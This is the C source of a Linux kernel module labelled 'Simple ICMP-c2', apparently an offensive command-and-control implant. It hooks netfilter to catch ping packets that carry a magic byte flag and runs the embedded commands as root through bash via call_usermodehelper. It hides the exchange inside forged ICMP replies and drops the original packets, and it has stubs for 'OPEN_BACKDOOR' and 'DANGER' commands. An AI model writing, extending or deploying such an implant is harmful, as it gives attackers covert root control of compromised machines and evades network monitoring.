#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/ktime.h>
#include <linux/jiffies.h>
#include <linux/uaccess.h>
#include <linux/inet.h>
#include <linux/skbuff.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/if_ether.h>
#include <net/ip.h>
#include <linux/workqueue.h>

#define DEBUG_K

MODULE_LICENSE("GPL");
MODULE_AUTHOR("jackdunf@buffalo.edu");
MODULE_DESCRIPTION("Simple ICMP-c2");

#define ICMP_ECHO   8
#define ICMP_REPLY  0
#define ICMP_HLEN   sizeof(struct icmphdr)

#define FLAG        "\x70\x95\x05"
#define FLAG_LEN    3

static struct socket *raw_socket;
static struct nf_hook_ops nfho;
static struct workqueue_struct *work_queue;
static atomic_t work_count = ATOMIC_INIT(0);


typedef enum COMMANDS {
    START_SERVICE = 0,
    STOP_SERVICE  = 1,
    OPEN_BACKDOOR = 2,
    DANGER        = 4
} command_t;

struct work_item {
    struct work_struct work;
    char *command;
};

// Work
static void icmp_handle_work(struct work_struct *work);
// Commands
static int queue_execute(command_t type, char *argument);
char **split_on_strings(char *string, int *token_count);
void free_tokens(char **tokens, int token_count);
int parse_and_run_command(char *raw_input);
// Networking
unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
static uint16_t checksum(uint16_t *data, int len);
static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len);

static void icmp_handle_work(struct work_struct *work) {
    int ret;

    #ifdef DEBUG_K
        printk(KERN_DEBUG "Entering work handler...\n");
        printk(KERN_DEBUG "Queue length: %d", atomic_read(&work_count));
    #endif
    struct work_item *work_item = container_of(work, struct work_item, work);

    char *argv[] = { "/bin/bash", "-c", work_item->command, NULL };
    char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    #ifdef DEBUG_K
    if (ret != 0){
        pr_err("Error (%d) executing command: \"%s\"\n", ret, work_item->command);
    }
    #endif

    atomic_dec(&work_count);
    kfree(work_item->command);
    kfree(work_item);
}

static int queue_execute(command_t type, char *argument){
    char *command = kmalloc(128, GFP_KERNEL);
    memset(command, 0, 128);


    switch(type){
        case START_SERVICE:
        case STOP_SERVICE:
            #ifdef DEBUG_K
                pr_info("PRAC: %sing service %s\n", type == START_SERVICE ? "start" : "stopp", argument);
            #endif
            snprintf(command, 127, "systemctl %s %s", type == START_SERVICE ? "start" : "stop", argument);
            #ifdef DEBUG_K
                pr_info("Command in function: %s\n", command);
            #endif
            break;
        case OPEN_BACKDOOR:
            #ifdef DEBUG_K
                pr_err("OPEN_BACKDOOR: Not yet implemented");
            #endif
            return -1;
        case DANGER:
            #ifdef DEBUG_K
                pr_err("DANGER: Not yet implemented");
            #endif
            return -1;
        default:
            #ifdef DEBUG_K
                pr_err("Invalid Command Type: %d\n", type);
            #endif
            return -1;
    }

    #ifdef DEBUG_K
        printk(KERN_DEBUG "Creating queue item...");
    #endif
    struct work_item *work = kmalloc(sizeof(struct work_item), GFP_KERNEL);
    work->command = command;

    #ifdef DEBUG_K
        printk(KERN_DEBUG "Queueing queue item...");
    #endif
    INIT_WORK(&work->work, icmp_handle_work);
    queue_work(work_queue, &work->work);
    atomic_inc(&work_count);
    #ifdef DEBUG_K
        printk(KERN_DEBUG "Enqueued");
    #endif

    return 0;
}

char **split_on_strings(char *string, int *token_count){
	int size = 5;
	char **output = (char **) kmalloc(size * sizeof(char *), GFP_KERNEL); // init alloc
	char *current_char = string;
	char *past = string;
	int i = 0;

	int keep_going = 1;
	// Loop until split
	while (keep_going){
		int current_size;
		while(*current_char != ' ' && *current_char != 0) ++current_char;
		if(*current_char == 0)
			keep_going = 0;

		if (i >= size)
			output = krealloc(output, (size += 3) * sizeof(char *), GFP_KERNEL);
            // TODO: add error handling

		current_size = current_char - past;
		char *current_block = (char *) kmalloc(current_size + 1, GFP_KERNEL);
		memcpy(current_block, past, current_size);
		current_block[current_size] = 0;
		output[i++] = current_block;
		past = ++current_char;
	}

	*token_count = i;
	return output;
}

void free_tokens(char **tokens, int token_count){
	for(int i = 0; i < token_count; i++){
		kfree(tokens[i]);
	}
	kfree(tokens);
}

// Returns status
int parse_and_run_command(char *raw_input){
    char **argv_in;
    int argc_in;
    command_t type;
    int status = 0;

    argv_in = split_on_strings(raw_input, &argc_in);
    #ifdef DEBUG_K
        pr_info("Count: %d\n", argc_in);
        for(int i = 0; i < argc_in; i++){
            pr_info("Token %d: %s\n", i+1, argv_in[i]);
        }
    #endif

    if(strncmp(argv_in[0], "START_SERVICE", 13) == 0){
        type = START_SERVICE;
    } else if(strncmp(argv_in[0], "STOP_SERVICE", 12) == 0){
        type = STOP_SERVICE;
    } else {
        type = DANGER;
    }

    #ifdef DEBUG_K
        pr_info("Type: %d\n", type);
    #endif

    // Only takes second word rn
    status = queue_execute(type, argv_in[1]);

    free_tokens(argv_in, argc_in);
    return status;
}

// Source: elsewhere
static uint16_t checksum(uint16_t *data, int len) {
    uint32_t sum = 0;
    while (len > 1) { sum += *data++; len -= 2; }
    if (len == 1) sum += *(uint8_t *)data;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)~sum;
}

// Source: jackdunf, different file
static int send_icmp_reply(struct icmphdr *incoming_icmp, __be32 address, char *payload, size_t payload_len) {
    struct sockaddr_in dest_addr;
    struct msghdr msg = {};
    struct kvec iov;
    char *packet;
    struct icmphdr *icmp_hdr;
    int ret = 0;
    const size_t PACKET_SIZE = ICMP_HLEN + payload_len;

    // Allocate memory for the packet
    packet = kmalloc(PACKET_SIZE, GFP_KERNEL);
    if (!packet)
        return -ENOMEM;

    // Fill ICMP header
    icmp_hdr = (struct icmphdr *)packet;
    icmp_hdr->type = ICMP_REPLY;
    icmp_hdr->code = 0;
    icmp_hdr->checksum = 0;
    icmp_hdr->un.echo.id = incoming_icmp->un.echo.id;
    icmp_hdr->un.echo.sequence = incoming_icmp->un.echo.sequence;

    // Add payload
    memcpy(packet + ICMP_HLEN, payload, payload_len);

    // Calculate checksum
    icmp_hdr->checksum = checksum((uint16_t *)packet, PACKET_SIZE);

    // Initialize destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = address;

    // Initialize the socket
    ret = sock_create_kern(&init_net, AF_INET, SOCK_RAW, IPPROTO_ICMP, &raw_socket);
    if (ret < 0) {
        pr_err("Failed to create raw socket: %d\n", ret);
        kfree(packet);
        return ret;
    }

    // Prepare message
    iov.iov_base = packet;
    iov.iov_len = PACKET_SIZE;
    iov_iter_kvec(&msg.msg_iter, WRITE, &iov, 1, PACKET_SIZE);

    msg.msg_name = &dest_addr;
    msg.msg_namelen = sizeof(dest_addr);

    // Send the ICMP Echo Request
    ret = kernel_sendmsg(raw_socket, &msg, &iov, 1, PACKET_SIZE);
    #ifdef DEBUG_K
        if (ret < 0) {
            pr_err("ICMP failed to reply: %d\n", ret);
        } else {
            pr_info("ICMP echo request sent successfully\n");
        }
    #endif

    // Clean up
    sock_release(raw_socket);
    kfree(packet);

    return (ret >= 0) ? 0 : ret;
}


unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    struct iphdr *iph;
    struct icmphdr *icmph;
    unsigned char *payload_start;
    char *payload;
    int icmp_payload_len;

    // Ensure it's an IPv4 packet with ICMP
    iph = ip_hdr(skb);
    if (!iph || iph->protocol != IPPROTO_ICMP) {
        return NF_ACCEPT;
    }

    icmph = icmp_hdr(skb);
    if (!icmph || icmph->type != ICMP_ECHO) {
        return NF_ACCEPT;
    }

    // Below overestimates
    // unsigned char *end_of_skb = skb->data + skb->len; 
    // icmp_payload_len = (void *)end_of_skb - ( (void *)icmph + ICMP_HLEN );

    icmp_payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - ICMP_HLEN;
    payload_start = (void *)icmph + ICMP_HLEN;

    payload = (char *) kmalloc(icmp_payload_len + 1, GFP_KERNEL);
    memcpy(payload, payload_start, icmp_payload_len);
    payload[icmp_payload_len] = 0;

    #ifdef DEBUF_K
        pr_info("icmp_payload_len: %d\n", icmp_payload_len);
    #endif
    if(icmp_payload_len <= 0 || icmp_payload_len < FLAG_LEN){
        return NF_ACCEPT;
    }

    // Check for flag
    if(strncmp(payload, FLAG, FLAG_LEN) != 0){
        #ifdef DEBUG_K
            pr_info("Regular ICMP, no flag\n");
        #endif
        return NF_ACCEPT;
    }
    
    #ifdef DEBUG_K
        pr_info("Payload contained flag\n");
    #endif

    char *command = payload+FLAG_LEN;
    #ifdef DEBUG_K
        pr_info("Command: %s\n", command);
    #endif
    int status = parse_and_run_command(command);
    #ifdef DEBUG_K
        pr_info("Status: %d\n", status);
    #endif

    // TODO: Check if ignore all is set
    if(send_icmp_reply(icmph, iph->saddr, payload, icmp_payload_len) < 0){
        return NF_ACCEPT;
    }
    return NF_DROP;
}

// Module initialization
static int __init init_icmp_hijack(void) {
    #ifdef DEBUG_K
        printk(KERN_INFO "Loading icmp-c2 module...\n");
    #endif

    // Fill in the nf_hook_ops structure
    nfho.hook = icmp_hijack;                     // Hook function
    // nfho.hooknum = NF_INET_LOCAL_IN;        // Apply to incoming packets
    nfho.hooknum = NF_INET_PRE_ROUTING;        // Going to try to manipulate
    nfho.pf = PF_INET;                          // IPv4
    nfho.priority = NF_IP_PRI_FIRST;            // Set highest priority

    // Register the hook
    nf_register_net_hook(&init_net, &nfho);

    #ifdef DEBUG_K
        printk(KERN_INFO "icmp handler loaded.\n");
    #endif

    return 0;
}

// Module cleanup
static void __exit exit_icmp_hijack(void) {
    printk(KERN_INFO "Unloading icmp...\n");

    // Unregister the hook
    nf_unregister_net_hook(&init_net, &nfho);
    printk(KERN_INFO "icmp handler unloaded.\n");
}

module_init(init_icmp_hijack);
module_exit(exit_icmp_hijack);
